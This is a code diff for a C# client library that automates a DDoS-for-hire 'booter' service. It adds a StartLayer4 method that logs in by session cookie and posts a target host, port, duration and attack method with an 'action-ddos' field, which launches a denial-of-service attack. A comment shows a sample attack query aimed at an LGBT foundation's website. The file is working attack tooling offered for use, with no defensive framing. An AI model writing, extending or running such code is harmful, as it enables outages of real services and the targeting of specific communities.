@@ -29,7 +29,7 @@ namespace ts3booter.MainAPI
             webRequest.Method = "POST";
             webRequest.ContentType = "application/x-www-form-urlencoded";
             pass = HttpUtility.UrlEncode(pass);
-            string login_query = "username=" + user + "&password=" + pass + "&g-recaptcha-response=&action-login=";
+            string login_query = "username=" + HttpUtility.UrlEncode(user) + "&password=" + pass + "&g-recaptcha-response=&action-login=";
             using (StreamWriter sw = new StreamWriter(webRequest.GetRequestStream()))
             {
                 sw.WriteLine(login_query);
@@ -103,7 +103,40 @@ namespace ts3booter.MainAPI
                 return null;
             }
         }
-
+        public bool StartLayer4(string host, string method, int port = 80, int time = 60)
+        {
+            if (logged_in == false)
+            {
+                return false;
+            }
+            var layer4 = (HttpWebRequest)WebRequest.Create("https://ts3booter.net/home");
+            CookieContainer cookie = new CookieContainer();
+            cookie.Add(new Cookie("PHPSESSID", phpsessionid) { Domain = "ts3booter.net" });
+            layer4.CookieContainer = cookie;
+            layer4.Method = "POST";
+            string attack_query = "host%5B%5D=" + HttpUtility.UrlEncode(host) + "&port=" + HttpUtility.UrlEncode(port.ToString()) + "&time=" + HttpUtility.UrlEncode(time.ToString()) + "&method=" + method + "&action-ddos=";
+            layer4.ContentType = "application/x-www-form-urlencoded";
+            using (StreamWriter sw = new StreamWriter(layer4.GetRequestStream()))
+            {
+                sw.WriteLine(attack_query);
+            }
+            HttpWebResponse status = (HttpWebResponse)layer4.GetResponse();
+            using (StreamReader reader = new StreamReader (status.GetResponseStream()))
+            {
+                string response = reader.ReadToEnd();
+                if (response.Contains("icon fa fa-ban"))
+                {
+                    return false;
+                } else if (response.Contains("icon fas fa-check-circle"))
+                {
+                    return true;
+                } else
+                {
+                    return false;
+                }
+            }
+            // host%5B%5D=https%3A%2F%2Flgbt.foundation%2F&port=443&time=60&method=HTTP-LOAD&action-ddos=
+        }
 
     }
 }
